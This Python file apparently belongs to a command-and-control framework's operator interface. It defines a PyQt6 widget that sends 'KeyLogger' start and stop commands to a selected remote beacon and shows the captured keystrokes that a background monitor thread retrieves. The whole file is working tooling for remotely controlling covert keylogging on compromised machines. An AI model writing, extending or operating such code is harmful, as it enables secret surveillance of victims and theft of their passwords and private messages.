import traceback
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPlainTextEdit, 
                            QPushButton, QMessageBox)
from PyQt6.QtGui import QFont
from PyQt6.QtCore import QTimer, QMetaObject, Qt
from database import BeaconRepository
from workers import KeyLoggerOutputMonitor
from utils import FontManager
import utils

class KeyLoggerDisplay(QWidget):
    def __init__(self, beacon_repository: BeaconRepository):
        super().__init__()
        self.beacon_repository = beacon_repository
        self.current_beacon_id = None
        self.output_monitor = None
        
        # Pending monitor change to avoid blocking UI
        self._pending_agent_change = None
        self._monitor_change_timer = QTimer()
        self._monitor_change_timer.setSingleShot(True)
        self._monitor_change_timer.timeout.connect(self._apply_pending_monitor_change)
        
        # Try to use FontManager, but don't fail if it's not available
        try:
            FontManager().add_relative_font_widget(self, 0)
            self.font_manager = FontManager()
        except:
            self.font_manager = None
            
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        # Create horizontal layout for buttons
        button_layout = QHBoxLayout()
        
        self.start_btn = QPushButton("Start KeyLogger")
        self.start_btn.clicked.connect(self.send_KeyLogger_start) 
        
        self.stop_btn = QPushButton("Stop KeyLogger")
        self.stop_btn.clicked.connect(self.send_KeyLogger_stop) 
        
        # Add buttons to horizontal layout
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        
        # Add button layout to main layout
        layout.addLayout(button_layout)

        self.output_display = QPlainTextEdit()
        self.output_display.setReadOnly(True)
        self.output_display.setPlaceholderText("Waiting for KeyLogger output...")
        
        if self.font_manager:
            self.font_manager.add_relative_font_widget(self.output_display, -2)
        self.output_display.setFont(QFont("Consolas"))
        layout.addWidget(self.output_display)
        self.setLayout(layout)

    def send_KeyLogger_start(self):
        if not self.current_beacon_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|start"
        try:
            self.beacon_repository.update_beacon_command(self.current_beacon_id, command)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def send_KeyLogger_stop(self):
        if not self.current_beacon_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return
        command = "execute_module|KeyLogger|stop"
        try:
            self.beacon_repository.update_beacon_command(self.current_beacon_id, command)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
            QMessageBox.warning(self, "Error", f"Failed to send: {str(e)}")

    def set_agent(self, beacon_id: str):
        if beacon_id == self.current_beacon_id:
            return
        
        # Don't block UI thread - defer monitor changes
        self._pending_agent_change = beacon_id
        self.current_beacon_id = beacon_id
        
        # Clear display immediately for responsiveness
        self.output_display.clear()
        
        # Schedule monitor change for next event loop cycle
        self._monitor_change_timer.start(1)  # 1ms delay
    
    def _apply_pending_monitor_change(self):
        """Apply pending monitor change without blocking UI thread"""
        beacon_id = self._pending_agent_change
        if beacon_id is None:
            return
            
        # Stop existing monitor (this can be slow)
        if self.output_monitor is not None:
            self.output_monitor.stop()
            # Use timer to wait for monitor stop without blocking
            QTimer.singleShot(100, lambda: self._wait_for_monitor_stop())
        else:
            self._start_new_monitor(beacon_id)
    
    def _wait_for_monitor_stop(self):
        """Wait for monitor to stop and start new one"""
        if self.output_monitor is not None:
            self.output_monitor.wait()  # This is the blocking operation
        self._start_new_monitor(self._pending_agent_change)
    
    def _start_new_monitor(self, beacon_id: str):
        """Start new monitor for agent"""
        from config import ServerConfig
        config = ServerConfig()
        self.output_monitor = KeyLoggerOutputMonitor(beacon_id, self.beacon_repository, config)
        self.output_monitor.output_received.connect(self.update_output)
        self.output_monitor.start()
        self._pending_agent_change = None
    
    def set_beacon(self, beacon_id: str):
        """Set the current beacon ID - delegates to set_agent for compatibility"""
        self.set_agent(beacon_id)

    def update_output(self, text: str):
        self.output_display.setPlainText(text)
        self.output_display.verticalScrollBar().setValue(
            self.output_display.verticalScrollBar().maximum()
        )

    def cleanup(self):
        if self.output_monitor is not None:
            self.output_monitor.stop()
            self.output_monitor.wait()